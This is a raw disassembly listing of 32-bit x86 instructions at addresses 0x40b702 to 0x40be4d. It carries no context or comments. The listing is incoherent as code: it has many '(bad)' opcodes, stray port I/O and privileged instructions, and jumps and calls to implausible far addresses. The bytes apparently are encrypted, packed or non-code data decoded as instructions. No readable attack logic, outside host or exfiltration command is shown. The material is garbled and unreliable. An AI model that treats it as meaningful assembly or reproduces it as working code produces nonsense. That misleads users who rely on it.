  40b702:	(bad)  
  40b703:	out    dx,al
  40b704:	(bad)  
  40b705:	push   ebp
  40b706:	dec    edx
  40b707:	mov    ebx,0xf0da24c4
  40b70c:	add    cl,BYTE PTR [ecx+0x2de785db]
  40b712:	fwait
  40b713:	sub    ch,BYTE PTR [edx-0x4d597507]
  40b719:	bound  esi,QWORD PTR [edx-0x48]
  40b71c:	test   al,0xc8
  40b71e:	push   ds
  40b71f:	adc    al,ah
  40b721:	sbb    ah,BYTE PTR cs:[edx]
  40b724:	push   ebp
  40b725:	and    BYTE PTR [edx+0x1664ceef],al
  40b72b:	and    DWORD PTR [edi+0x22],ecx
  40b72e:	push   ebx
  40b72f:	scas   al,BYTE PTR es:[edi]
  40b730:	xlat   BYTE PTR ds:[ebx]
  40b731:	cmp    eax,0x2f453bf7
  40b736:	mov    DWORD PTR [esi-0x5769e0ae],ebp
  40b73c:	sbb    DWORD PTR [eax-0x4da8de45],esp
  40b742:	mov    bl,0x2c
  40b744:	loope  0x40b6da
  40b746:	jns    0x40b796
  40b748:	stc    
  40b749:	je     0x40b7ca
  40b74b:	mov    ds:0x2bd86d30,eax
  40b750:	push   es
  40b751:	mov    edx,0xc28213e5
  40b756:	repz mov ebp,0xcc80c60b
  40b75c:	xchg   edi,eax
  40b75d:	or     dh,cl
  40b75f:	or     edi,DWORD PTR [esi+0x66]
  40b762:	rcr    BYTE PTR [edi+0x29],1
  40b765:	or     ecx,ecx
  40b767:	js     0x40b71a
  40b769:	popf   
  40b76a:	call   0x9c453c9a
  40b76f:	jle    0x40b7c8
  40b771:	cmp    al,0x95
  40b773:	sbb    DWORD PTR [edi+0x60f89912],edi
  40b779:	dec    ebx
  40b77a:	aad    0xcf
  40b77c:	jle    0x40b7c9
  40b77e:	lea    ebp,[ecx]
  40b780:	add    DWORD PTR [ebp+0x7c],0x23
  40b784:	das    
  40b785:	push   0x6875da43
  40b78a:	enter  0x77a5,0xba
  40b78e:	mov    ecx,esi
  40b790:	mov    edx,0x582aaefb
  40b795:	sbb    eax,0x1ebc681
  40b79a:	dec    edi
  40b79b:	(bad)  [ebx]
  40b79d:	mov    ds:0xd45c277c,al
  40b7a2:	sub    ch,bh
  40b7a4:	xchg   ebx,esi
  40b7a6:	inc    ecx
  40b7a7:	loop   0x40b753
  40b7a9:	pop    edx
  40b7aa:	jp     0x40b782
  40b7ac:	cli    
  40b7ad:	or     edi,0xffffffd8
  40b7b0:	stos   BYTE PTR es:[edi],al
  40b7b1:	lahf   
  40b7b2:	pop    esp
  40b7b3:	cmp    DWORD PTR [ecx+0x64],edi
  40b7b6:	cli    
  40b7b7:	push   0x37
  40b7b9:	pop    edx
  40b7ba:	xchg   BYTE PTR [ebx+edi*4-0x63e11312],dl
  40b7c1:	or     BYTE PTR [ebx+esi*1+0x5],0x9a
  40b7c6:	stos   BYTE PTR es:[edi],al
  40b7c7:	xor    edi,esi
  40b7c9:	and    DWORD PTR [edi+0x45],esi
  40b7cc:	call   FWORD PTR [ecx]
  40b7ce:	inc    ecx
  40b7cf:	cmp    ch,BYTE PTR [ebp+0x6be5b38c]
  40b7d5:	fld    TBYTE PTR [ebx]
  40b7d7:	or     BYTE PTR [eax-0x19],bh
  40b7da:	pushf  
  40b7db:	sbb    BYTE PTR [edx+0x7f9e11c1],bh
  40b7e1:	inc    ecx
  40b7e2:	and    ebp,0x34b635c7
  40b7e8:	inc    edi
  40b7e9:	popf   
  40b7ea:	stc    
  40b7eb:	stc    
  40b7ec:	mov    esp,0xb3e4b02e
  40b7f1:	fnstsw WORD PTR [ebx]
  40b7f3:	xchg   esi,eax
  40b7f4:	data16 rcl BYTE PTR [edi],0x41
  40b7f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7f9:	mov    al,0x16
  40b7fb:	shl    BYTE PTR [ecx-0x26],0x23
  40b7ff:	test   al,0x0
  40b801:	mov    cl,0xe4
  40b803:	rol    BYTE PTR [ecx+edx*8-0x8f21cb9],0xfe
  40b80b:	sahf   
  40b80c:	push   0x2f
  40b80e:	adc    esp,DWORD PTR [edi+0xadd01b3]
  40b814:	fadd   st(6),st
  40b816:	or     eax,0x986cd7b9
  40b81b:	jnp    0x40b890
  40b81d:	cs jl  0x40b811
  40b820:	frstor [ecx-0x5e]
  40b823:	jbe    0x40b890
  40b825:	xor    ebx,DWORD PTR [ebx]
  40b827:	mov    dl,0x62
  40b829:	mov    ebx,0x627b7468
  40b82e:	or     dl,BYTE PTR [eax+0x4faccfdc]
  40b834:	(bad)  
  40b835:	fadd   DWORD PTR [esi+0x111f8554]
  40b83b:	mov    ss,WORD PTR [eax+eax*8-0x5b]
  40b83f:	pushf  
  40b840:	(bad)  
  40b841:	pop    ebx
  40b842:	bound  ecx,QWORD PTR [edi]
  40b844:	out    dx,al
  40b845:	cmc    
  40b846:	fwait
  40b847:	jmp    0xa6d2fdec
  40b84c:	outs   dx,BYTE PTR ds:[esi]
  40b84d:	pop    esp
  40b84e:	adc    edi,DWORD PTR [eax+0x148c2620]
  40b854:	push   ebx
  40b855:	cmp    ecx,DWORD PTR [esi]
  40b857:	xor    dh,BYTE PTR [ebx]
  40b859:	cmp    DWORD PTR [ebx],ecx
  40b85b:	mov    ecx,0xb9a751b5
  40b860:	aas    
  40b861:	mov    esp,esi
  40b863:	mov    cl,0x87
  40b865:	imul   ebx,DWORD PTR [esi],0x8e961427
  40b86b:	jbe    0x40b872
  40b86d:	cs out 0x49,al
  40b870:	xor    bh,bh
  40b872:	xchg   edx,eax
  40b873:	bound  esi,QWORD PTR [esi-0x17]
  40b876:	frstor [eax-0x5e9a2d32]
  40b87c:	mov    al,0xd6
  40b87e:	cld    
  40b87f:	mov    edx,0x5bd45518
  40b884:	xor    DWORD PTR [ebx+0x76bac684],ebx
  40b88a:	jge    0x40b88e
  40b88c:	lahf   
  40b88d:	jge    0x40b833
  40b88f:	clc    
  40b890:	push   ds
  40b891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b892:	pop    ecx
  40b893:	scas   eax,DWORD PTR es:[edi]
  40b894:	jae    0x40b82f
  40b896:	inc    ecx
  40b897:	cwde   
  40b898:	sub    BYTE PTR [edi+0x6cffef75],bl
  40b89e:	(bad)  
  40b89f:	pop    edx
  40b8a0:	sti    
  40b8a1:	mov    ds:0xe773098e,eax
  40b8a6:	add    al,BYTE PTR [edx+0x473dd133]
  40b8ac:	mov    edi,0x6c8c85fe
  40b8b1:	jno    0x40b853
  40b8b3:	jbe    0x40b8dc
  40b8b5:	stos   BYTE PTR es:[edi],al
  40b8b6:	sub    DWORD PTR [edi+ebx*1-0x3582f7ee],esi
  40b8bd:	xchg   DWORD PTR [ecx-0xdc449d4],ebp
  40b8c3:	jmp    0x74c399e9
  40b8c8:	shl    DWORD PTR [edi-0x3c046f14],1
  40b8ce:	mov    ch,0x8b
  40b8d0:	out    dx,al
  40b8d1:	les    ecx,FWORD PTR [ebp-0x26]
  40b8d4:	add    al,0xc2
  40b8d6:	imul   ecx,DWORD PTR [eax],0x66
  40b8d9:	or     ebp,DWORD PTR [eax]
  40b8db:	rcl    BYTE PTR [esi],1
  40b8dd:	and    BYTE PTR [ebx+0x5952f7cb],0xdd
  40b8e4:	push   ebx
  40b8e5:	pushf  
  40b8e6:	or     eax,0x130bee1b
  40b8eb:	pusha  
  40b8ec:	pop    ds
  40b8ed:	(bad)  
  40b8ee:	and    esp,edx
  40b8f0:	stos   DWORD PTR es:[edi],eax
  40b8f1:	shr    BYTE PTR [esi+0x2aa09b30],1
  40b8f7:	push   cs
  40b8f8:	fistp  QWORD PTR [ecx]
  40b8fa:	cdq    
  40b8fb:	push   ss
  40b8fc:	mov    edi,0xf30bcaf7
  40b901:	(bad)  
  40b902:	icebp  
  40b903:	cmp    DWORD PTR ds:0xfe74a44d,eax
  40b909:	int3   
  40b90a:	adc    ebp,DWORD PTR [eax+ebx*8+0x12d5f72f]
  40b911:	fwait
  40b912:	mov    ch,0xef
  40b914:	dec    esp
  40b915:	cwde   
  40b916:	push   edi
  40b917:	je     0x40b912
  40b919:	xor    DWORD PTR [eax-0x16],ecx
  40b91c:	adc    al,bh
  40b91e:	xor    al,cl
  40b920:	mov    al,0xa6
  40b922:	xchg   ebp,eax
  40b923:	int    0x4e
  40b925:	sub    dl,BYTE PTR [esi+0xaccc0c5]
  40b92b:	(bad)  
  40b92c:	xchg   BYTE PTR [ebp+0x6e],al
  40b92f:	adc    ecx,DWORD PTR [ecx]
  40b931:	cmp    BYTE PTR [edi+0x7a79700d],ch
  40b937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b938:	push   es
  40b939:	cmp    al,0x33
  40b93b:	push   ecx
  40b93c:	cmc    
  40b93d:	mul    DWORD PTR [eax+0x22]
  40b940:	inc    ecx
  40b941:	xor    cl,BYTE PTR [ebp-0x7a]
  40b944:	sub    DWORD PTR [ebx],ebx
  40b946:	adc    cl,BYTE PTR ds:0xa3ece4d1
  40b94c:	mov    al,0xbf
  40b94e:	xor    al,0x5a
  40b950:	imul   edx,DWORD PTR [edi-0x8bf0ba8],0xb7aedea9
  40b95a:	jo     0x40b91a
  40b95c:	ins    DWORD PTR es:[edi],dx
  40b95d:	push   ds
  40b95e:	dec    esi
  40b95f:	retf   
  40b960:	inc    esi
  40b961:	rol    edx,1
  40b963:	cmp    al,0x41
  40b965:	or     dh,BYTE PTR [ecx-0x17632458]
  40b96b:	stos   DWORD PTR es:[edi],eax
  40b96c:	xchg   esi,eax
  40b96d:	pop    esp
  40b96e:	outs   dx,BYTE PTR ds:[esi]
  40b96f:	xor    eax,0x9f8ec111
  40b974:	sub    ebx,edx
  40b976:	and    DWORD PTR [ebp-0x34e4823d],ebx
  40b97c:	stos   BYTE PTR es:[edi],al
  40b97d:	pop    ds
  40b97e:	sub    eax,0xa69026e6
  40b983:	ins    DWORD PTR es:[edi],dx
  40b984:	int3   
  40b985:	fcom   DWORD PTR [eax]
  40b987:	ins    DWORD PTR es:[edi],dx
  40b988:	cli    
  40b989:	pop    eax
  40b98a:	pop    si
  40b98c:	cli    
  40b98d:	int3   
  40b98e:	leave  
  40b98f:	sub    al,0x23
  40b992:	enter  0x403,0x4c
  40b996:	(bad)  
  40b998:	adc    eax,0xf6f563fe
  40b99d:	stc    
  40b99e:	or     BYTE PTR [eax],ch
  40b9a0:	mov    ds:0x403076d1,al
  40b9a5:	mov    ch,BYTE PTR [esi+0x5a]
  40b9a8:	xor    esi,DWORD PTR gs:[eax+0x67ff2c19]
  40b9af:	jg     0x40b9f6
  40b9b1:	jp     0x40ba2b
  40b9b3:	(bad)  
  40b9b5:	gs inc ebp
  40b9b7:	mov    BYTE PTR [ebx+0x1d],dl
  40b9ba:	mov    esp,0xa39c417a
  40b9bf:	pop    edx
  40b9c0:	or     edx,DWORD PTR [edi+0x6d]
  40b9c3:	lds    ebp,FWORD PTR [ecx]
  40b9c5:	pop    ebp
  40b9c6:	inc    ebx
  40b9c7:	ss jmp 0x9a78:0x70886c05
  40b9cf:	pop    ecx
  40b9d0:	mov    bh,0x11
  40b9d2:	shl    esp,0x75
  40b9d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9d6:	sub    DWORD PTR [edi],esi
  40b9d8:	or     eax,0x7cdb5891
  40b9dd:	neg    al
  40b9df:	mov    ds:0x8d857a77,eax
  40b9e4:	or     dl,BYTE PTR [eax-0x2dba90c2]
  40b9ea:	imul   DWORD PTR [ebx+edx*1+0x46]
  40b9ee:	stos   BYTE PTR es:[edi],al
  40b9ef:	sbb    DWORD PTR [eax-0x5be552b],edi
  40b9f5:	mov    DWORD PTR [edi-0x347fe0c1],edi
  40b9fb:	aam    0x9e
  40b9fd:	data16 mov al,0xdb
  40ba00:	push   esp
  40ba01:	xchg   edi,eax
  40ba02:	std    
  40ba03:	or     BYTE PTR [ebx+0xe],cl
  40ba06:	sub    DWORD PTR [esi+0x54],edi
  40ba09:	ins    DWORD PTR es:[edi],dx
  40ba0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba0b:	jmp    0x40ba5b
  40ba0d:	push   edx
  40ba0e:	jo     0x40b9dc
  40ba10:	jg     0x40ba8d
  40ba12:	mov    bl,BYTE PTR [esi-0x1b74e37a]
  40ba18:	out    dx,al
  40ba19:	dec    edi
  40ba1a:	cli    
  40ba1b:	and    dh,0x5e
  40ba1e:	fisub  WORD PTR ds:[ecx+0x45a571f8]
  40ba25:	sbb    BYTE PTR [ebx-0xd5847fc],dh
  40ba2b:	add    BYTE PTR [ebx+0x3a1c5d20],bh
  40ba31:	push   edi
  40ba32:	and    ebp,ebp
  40ba34:	iret   
  40ba35:	inc    edi
  40ba36:	xor    DWORD PTR [ebx],0xffffffbe
  40ba39:	test   DWORD PTR [ecx],0xab3bdd36
  40ba3f:	xor    eax,0xabd1db1c
  40ba44:	popa   
  40ba45:	ds (bad) 
  40ba47:	add    edx,DWORD PTR ss:[ecx+0x6e]
  40ba4b:	and    DWORD PTR [ecx],ebp
  40ba4d:	repnz inc ebp
  40ba4f:	mov    ebp,0x4f5dec49
  40ba54:	dec    esi
  40ba55:	fisubr WORD PTR [ebp+esi*1-0x136f9512]
  40ba5c:	ds rdpmc 
  40ba5f:	clc    
  40ba60:	dec    ebx
  40ba61:	outs   dx,BYTE PTR ds:[esi]
  40ba62:	jae    0x40b9f1
  40ba64:	pusha  
  40ba65:	push   ds
  40ba66:	sbb    dh,BYTE PTR [esi-0x579399f7]
  40ba6c:	cmp    eax,DWORD PTR [esi+0x54]
  40ba6f:	jb     0x40ba08
  40ba71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba72:	sbb    eax,0x40f5be31
  40ba77:	dec    ebx
  40ba78:	test   DWORD PTR [ebx],esi
  40ba7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba7b:	sar    BYTE PTR [ecx],cl
  40ba7d:	dec    edx
  40ba7e:	(bad)  
  40ba7f:	inc    ecx
  40ba80:	pop    edi
  40ba81:	pop    edx
  40ba82:	mov    esi,ecx
  40ba84:	in     al,dx
  40ba85:	shr    DWORD PTR [edx],1
  40ba87:	cmp    esi,edi
  40ba89:	sbb    eax,0xdd1d9907
  40ba8e:	or     DWORD PTR [ebp+0x5ed2a399],esp
  40ba94:	xchg   dh,ah
  40ba96:	addr16 jb 0x40ba36
  40ba99:	cwde   
  40ba9a:	retf   0x7fd2
  40ba9d:	arpl   bp,si
  40ba9f:	xor    al,0x17
  40baa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baa2:	test   al,0x5
  40baa4:	and    BYTE PTR [ebx+ecx*4+0x6505ca44],bh
  40baab:	in     al,dx
  40baac:	test   DWORD PTR [eax],ebx
  40baae:	test   al,0x62
  40bab0:	mov    al,ds:0x9abb22f8
  40bab5:	cmp    cl,BYTE PTR [edx+ecx*2+0x6522ad9d]
  40babc:	dec    edx
  40babd:	xchg   esp,eax
  40babe:	xchg   ebx,eax
  40babf:	lods   eax,DWORD PTR ds:[esi]
  40bac0:	push   edx
  40bac1:	jno    0x40ba82
  40bac3:	mov    ebp,0x349ec3c
  40bac8:	fptan  
  40baca:	sbb    ebp,DWORD PTR [esi-0x12]
  40bacd:	jnp    0x40ba6c
  40bacf:	fldcw  WORD PTR [ebx+0x8]
  40bad2:	mov    ds:0x54907b35,eax
  40bad7:	repz jne 0x40bb0f
  40bada:	popw   ds
  40badc:	xlat   BYTE PTR ds:[ebx]
  40badd:	dec    ecx
  40bade:	push   edi
  40badf:	jl     0x40ba83
  40bae1:	sbb    al,0xcd
  40bae3:	or     eax,0xde71c955
  40bae8:	mov    ecx,0x5a9748ae
  40baed:	jns    0x40bb03
  40baef:	test   eax,0x2a8c30ec
  40baf4:	sahf   
  40baf5:	mov    dl,0xe6
  40baf7:	pop    es
  40baf8:	pop    esp
  40baf9:	jo     0x40baeb
  40bafb:	adc    eax,0x921a570f
  40bb00:	ror    BYTE PTR [ebp-0x576c2749],cl
  40bb06:	inc    eax
  40bb07:	pop    ds
  40bb08:	jo     0x40bb60
  40bb0a:	int3   
  40bb0b:	leave  
  40bb0c:	and    BYTE PTR [edx+0x6b],ch
  40bb0f:	leave  
  40bb10:	inc    esp
  40bb11:	es push esi
  40bb13:	inc    dh
  40bb15:	cmp    DWORD PTR [ebp+0x181e0b06],ebx
  40bb1b:	jp     0x40bac1
  40bb1d:	(bad)  
  40bb1e:	adc    DWORD PTR [edx+0x7ab3bca8],ebx
  40bb24:	dec    ecx
  40bb25:	adc    bh,BYTE PTR [esi+0x62]
  40bb28:	mov    ds:0x51e03e76,eax
  40bb2d:	loopne 0x40bab7
  40bb2f:	add    al,0x6e
  40bb31:	test   BYTE PTR [edi],dh
  40bb33:	ror    BYTE PTR [ebp+0x3],cl
  40bb36:	out    dx,eax
  40bb37:	(bad)  
  40bb38:	loop   0x40bb2f
  40bb3a:	push   ebx
  40bb3b:	jg     0x40bb8c
  40bb3d:	aas    
  40bb3e:	adc    eax,0xe227adfe
  40bb43:	add    ch,BYTE PTR [ecx]
  40bb45:	fcomi  st,st(6)
  40bb47:	mov    cl,0x6d
  40bb49:	outs   dx,DWORD PTR ds:[esi]
  40bb4a:	adc    eax,DWORD PTR [ebx]
  40bb4c:	pop    ebp
  40bb4d:	inc    esi
  40bb4e:	push   edi
  40bb4f:	loop   0x40bb43
  40bb51:	sub    DWORD PTR [eax+esi*2],0x26
  40bb55:	fcmovnb st,st(0)
  40bb57:	sub    eax,ebp
  40bb59:	xor    al,0xf5
  40bb5b:	jp     0x40bb66
  40bb5d:	enter  0xe05,0x62
  40bb61:	mov    ds:0x45124967,al
  40bb66:	fld    TBYTE PTR [eax-0x3e95ac5a]
  40bb6c:	sbb    BYTE PTR [edx+ebx*8+0x6ec10dc7],0x1e
  40bb74:	ss push 0x837c25dc
  40bb7a:	sbb    al,0xd2
  40bb7c:	adc    ecx,ebx
  40bb7e:	mov    WORD PTR [esi-0x18f2f6fb],es
  40bb84:	imul   esp,DWORD PTR [eax+0x2de7bf9e],0x836e124d
  40bb8e:	aad    0x65
  40bb90:	bsf    edi,ecx
  40bb93:	mov    BYTE PTR [edi-0x5d],ch
  40bb96:	jmp    0x40bb59
  40bb98:	imul   ecx,DWORD PTR [esi-0x43],0x57
  40bb9c:	sub    BYTE PTR ds:0x53f34a3f,al
  40bba2:	pushf  
  40bba3:	aas    
  40bba4:	mov    bl,0xec
  40bba6:	jb     0x40bb77
  40bba8:	popf   
  40bba9:	inc    eax
  40bbaa:	sbb    ebx,DWORD PTR [ecx-0x504b0a08]
  40bbb0:	jp     0x40bc18
  40bbb2:	(bad)  
  40bbb3:	shl    BYTE PTR [eax],cl
  40bbb5:	fs int3 
  40bbb7:	xchg   esi,eax
  40bbb8:	loopne 0x40bc07
  40bbba:	push   edi
  40bbbb:	outs   dx,BYTE PTR ds:[esi]
  40bbbc:	adc    ebp,DWORD PTR [ecx+0x7c4faf9c]
  40bbc2:	and    eax,0xf0f510b6
  40bbc7:	aaa    
  40bbc8:	ins    DWORD PTR es:[edi],dx
  40bbc9:	stos   BYTE PTR es:[edi],al
  40bbca:	rcl    DWORD PTR [ebx-0x25],1
  40bbcd:	xchg   edi,eax
  40bbce:	push   0x92d35172
  40bbd3:	in     al,0x18
  40bbd5:	add    BYTE PTR [ecx],ah
  40bbd7:	inc    esp
  40bbd8:	out    0xf2,eax
  40bbda:	jnp    0x40bb69
  40bbdc:	out    dx,al
  40bbdd:	out    0xe3,eax
  40bbdf:	(bad)  
  40bbe0:	leave  
  40bbe1:	aad    0x27
  40bbe3:	pop    ds
  40bbe4:	ror    bl,0xfc
  40bbe7:	inc    ecx
  40bbe8:	call   0xc68d:0x8cc134c
  40bbef:	dec    DWORD PTR [eax]
  40bbf1:	mov    edi,0xf2c98fd3
  40bbf6:	out    dx,al
  40bbf7:	loopne 0x40bc09
  40bbf9:	mov    edi,0x4cf4e042
  40bbfe:	pop    es
  40bbff:	jno    0x40bbf3
  40bc01:	shl    DWORD PTR [ecx],0xea
  40bc04:	jns    0x40bba9
  40bc06:	xlat   BYTE PTR ds:[ebx]
  40bc07:	je     0x40bb96
  40bc09:	lock xchg esi,eax
  40bc0b:	lods   al,BYTE PTR ds:[esi]
  40bc0c:	int3   
  40bc0d:	adc    dl,BYTE PTR [esi+0x4e585014]
  40bc13:	les    edi,FWORD PTR ss:[edi+0x3b]
  40bc17:	mov    ebp,0xfb98bab1
  40bc1c:	and    eax,0x434a3f
  40bc21:	sub    ebp,esi
  40bc23:	ins    BYTE PTR es:[edi],dx
  40bc24:	cdq    
  40bc25:	push   ebx
  40bc26:	int    0x52
  40bc28:	ret    
  40bc29:	mov    ah,0x18
  40bc2b:	scas   al,BYTE PTR es:[edi]
  40bc2c:	dec    esi
  40bc2d:	jl     0x40bbfd
  40bc2f:	mov    DWORD PTR [eax+0x68],ecx
  40bc32:	pushf  
  40bc33:	pop    ebp
  40bc34:	xor    edx,esp
  40bc36:	stos   DWORD PTR es:[edi],eax
  40bc37:	(bad)  
  40bc38:	cmp    BYTE PTR [edx],ah
  40bc3a:	or     eax,0xafe5e903
  40bc3f:	cs jns 0x40bc3c
  40bc42:	jecxz  0x40bbd1
  40bc44:	cmp    al,BYTE PTR [ebp+0x3c1e1b24]
  40bc4a:	mov    ebp,0x6729a5da
  40bc4f:	shl    edi,cl
  40bc51:	add    al,0x7e
  40bc53:	ss push esi
  40bc55:	retf   0xef7
  40bc58:	push   ebp
  40bc59:	add    eax,DWORD PTR [eax]
  40bc5b:	jno    0x40bc8e
  40bc5d:	xchg   esi,eax
  40bc5e:	ds push 0xdb6c69ec
  40bc64:	leave  
  40bc65:	ud2    
  40bc67:	stos   DWORD PTR es:[edi],eax
  40bc68:	repnz and esi,DWORD PTR [ebx+0x63444445]
  40bc6f:	lahf   
  40bc70:	test   BYTE PTR [ebx-0x7da570a0],0x73
  40bc77:	add    DWORD PTR [esi+0x66],0xffffffe5
  40bc7b:	nop
  40bc7c:	sbb    eax,0x82eef105
  40bc81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc82:	daa    
  40bc83:	inc    edi
  40bc84:	lods   al,BYTE PTR ds:[esi]
  40bc85:	mov    al,ds:0xb844d572
  40bc8a:	dec    edx
  40bc8b:	push   ds
  40bc8c:	lods   eax,DWORD PTR ds:[esi]
  40bc8d:	test   BYTE PTR [ebp+0x51],bl
  40bc90:	cmp    edx,DWORD PTR [esi-0x69]
  40bc93:	or     BYTE PTR [esi],dh
  40bc95:	addr16 inc ecx
  40bc97:	arpl   WORD PTR [ebx],cx
  40bc99:	sub    eax,DWORD PTR [ebx+0x691c1738]
  40bc9f:	mov    cl,0xbc
  40bca1:	loope  0x40bd20
  40bca3:	int3   
  40bca4:	mov    dh,0xc3
  40bca6:	inc    esp
  40bca7:	jmp    0x40bc74
  40bca9:	ins    DWORD PTR es:[edi],dx
  40bcaa:	and    ebp,DWORD PTR [ebx]
  40bcac:	and    al,cl
  40bcae:	or     al,0x16
  40bcb0:	aas    
  40bcb1:	jp     0x40bccc
  40bcb3:	lds    esp,FWORD PTR [edi]
  40bcb5:	sub    DWORD PTR [edx],esi
  40bcb7:	push   ebp
  40bcb8:	mov    WORD PTR [edi-0x54ce7f77],?
  40bcbe:	sbb    ah,ch
  40bcc0:	imul   esi
  40bcc2:	mov    ch,0x64
  40bcc4:	cwde   
  40bcc5:	push   esi
  40bcc6:	inc    esp
  40bcc7:	or     ecx,eax
  40bcc9:	pushf  
  40bcca:	jns    0x40bcbe
  40bccc:	shl    DWORD PTR [ebx-0x57d206fb],cl
  40bcd2:	outs   dx,BYTE PTR ds:[esi]
  40bcd3:	popa   
  40bcd4:	nop
  40bcd5:	push   DWORD PTR [ebp+0x317f2c6b]
  40bcdb:	jb     0x40bd07
  40bcdd:	test   eax,0xc0b0191e
  40bce2:	stos   BYTE PTR es:[edi],al
  40bce3:	push   ecx
  40bce4:	hlt    
  40bce5:	mov    al,al
  40bce7:	repnz mov ebx,0x4285ec7a
  40bced:	mov    ah,0x89
  40bcef:	mov    cl,0x4f
  40bcf1:	fisub  DWORD PTR [edx]
  40bcf3:	mov    eax,0xe701257f
  40bcf8:	sbb    BYTE PTR [edx+0x60],al
  40bcfb:	sbb    BYTE PTR [esi-0xe],bh
  40bcfe:	xor    al,0xcc
  40bd00:	(bad)  
  40bd01:	jge    0x40bd28
  40bd03:	pop    edi
  40bd04:	mov    cl,BYTE PTR [edx]
  40bd06:	not    BYTE PTR [edi]
  40bd08:	std    
  40bd09:	inc    esp
  40bd0a:	jl     0x40bd7e
  40bd0c:	sysenter 
  40bd0e:	xor    eax,0x93787f60
  40bd13:	addr16 inc edi
  40bd15:	int3   
  40bd16:	jg     0x40bcf5
  40bd18:	aaa    
  40bd19:	mov    ecx,0x456bc2ae
  40bd1e:	cmc    
  40bd1f:	ins    DWORD PTR es:[edi],dx
  40bd20:	sub    cl,BYTE PTR [eax+0x26]
  40bd23:	fwait
  40bd24:	xor    DWORD PTR [ebp-0x34204116],esp
  40bd2a:	test   cl,0xcd
  40bd2d:	in     eax,dx
  40bd2e:	or     bx,WORD PTR [eax]
  40bd31:	fadd   QWORD PTR [edx+0x37]
  40bd34:	push   edx
  40bd35:	dec    ebp
  40bd36:	dec    esi
  40bd37:	mov    ecx,0x969ccd0e
  40bd3c:	imul   ecx,DWORD PTR [eax+0x633ef9da],0xffffffbe
  40bd43:	(bad)  
  40bd44:	fild   QWORD PTR [eax-0x6d]
  40bd47:	out    dx,al
  40bd48:	cdq    
  40bd49:	dec    ebp
  40bd4a:	popf   
  40bd4b:	cmp    DWORD PTR [ebp+0x16],esi
  40bd4e:	dec    edi
  40bd4f:	push   eax
  40bd50:	xchg   ebx,eax
  40bd51:	cmc    
  40bd52:	mov    al,ds:0x8c54763c
  40bd57:	mov    ds:0xdd3901e0,eax
  40bd5c:	mov    al,ds:0x3377996e
  40bd61:	push   es
  40bd62:	bound  ebx,QWORD PTR [ebp+ecx*8+0x4f]
  40bd66:	nop
  40bd67:	mov    BYTE PTR [edx-0x1b1374f3],bh
  40bd6d:	in     al,dx
  40bd6e:	push   ebp
  40bd6f:	xchg   ebx,eax
  40bd70:	and    BYTE PTR [ebx-0x50f673e],bl
  40bd76:	push   es
  40bd77:	mov    edi,0x4cfdcbd4
  40bd7c:	aas    
  40bd7d:	fwait
  40bd7e:	pop    eax
  40bd7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd80:	adc    ebp,DWORD PTR [ebp+0x6f]
  40bd83:	dec    ebx
  40bd84:	or     al,0xb6
  40bd86:	push   eax
  40bd87:	jb     0x40bdb2
  40bd89:	popa   
  40bd8a:	cmp    ch,cl
  40bd8c:	hlt    
  40bd8d:	test   eax,0x7950ee3b
  40bd92:	stos   BYTE PTR es:[edi],al
  40bd93:	mov    al,ds:0xcb47cd62
  40bd98:	sub    ah,dl
  40bd9a:	pop    ds
  40bd9b:	out    0x99,al
  40bd9d:	mov    edx,ebp
  40bd9f:	into   
  40bda0:	(bad)  
  40bda1:	test   eax,0x14d26008
  40bda6:	ds test eax,eax
  40bda9:	push   edi
  40bdaa:	and    dh,BYTE PTR [edi-0x1e]
  40bdad:	dec    ecx
  40bdae:	mov    DWORD PTR [edx-0x73025ee2],0x7576c127
  40bdb8:	sub    al,0x97
  40bdba:	psubsw mm4,mm0
  40bdbd:	mov    ds:0x7f5fda2f,al
  40bdc2:	or     DWORD PTR [eax-0x6f],0xffffffdd
  40bdc6:	loopne 0x40bd4f
  40bdc8:	mov    DWORD PTR es:0x1f4f7cd0,edi
  40bdcf:	xor    al,0xb2
  40bdd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdd2:	mov    esp,0xadd7d5c4
  40bdd7:	jne    0x40be2b
  40bdd9:	dec    edx
  40bdda:	int3   
  40bddb:	inc    edi
  40bddc:	xchg   edx,eax
  40bddd:	pusha  
  40bdde:	cmp    al,0xe1
  40bde0:	xchg   ebx,eax
  40bde1:	pusha  
  40bde2:	fwait
  40bde3:	repnz es aaa 
  40bde6:	or     BYTE PTR [edi-0x23],ah
  40bde9:	xchg   ebp,eax
  40bdea:	es out 0x52,eax
  40bded:	pop    ds
  40bdee:	mov    ch,0x66
  40bdf0:	cwde   
  40bdf1:	cmp    BYTE PTR ss:[edx+0x162cffe9],0x46
  40bdf9:	mov    BYTE PTR [edi+0x77],cl
  40bdfc:	popf   
  40bdfd:	scas   al,BYTE PTR es:[edi]
  40bdfe:	xlat   BYTE PTR ds:[ebx]
  40bdff:	repnz bound esp,QWORD PTR [ebx-0x125f26e2]
  40be06:	pushf  
  40be07:	jmp    0x27b055b9
  40be0c:	xchg   ebx,eax
  40be0d:	inc    ebx
  40be0e:	pop    ecx
  40be0f:	inc    ebx
  40be10:	pop    edi
  40be11:	test   al,0xbb
  40be13:	mov    ebx,0xbf886281
  40be18:	arpl   WORD PTR [ecx-0x40ef3577],bx
  40be1e:	jle    0x40be9d
  40be20:	push   ebp
  40be21:	outs   dx,BYTE PTR ds:[esi]
  40be22:	lods   eax,DWORD PTR ds:[esi]
  40be23:	mov    bl,0x64
  40be25:	mov    al,ds:0xe873fc35
  40be2a:	xor    eax,0x65c912eb
  40be2f:	lea    esp,[esp+eax*8-0x7e0caff3]
  40be36:	es or  al,0x18
  40be39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be3a:	aam    0xfe
  40be3c:	and    DWORD PTR [esp+edx*8-0x72f463a3],0x43
  40be44:	shl    DWORD PTR [eax+0x32dbe2b9],1
  40be4a:	icebp  
  40be4b:	inc    eax
  40be4c:	int3   
  40be4d:	rcl    ch,1
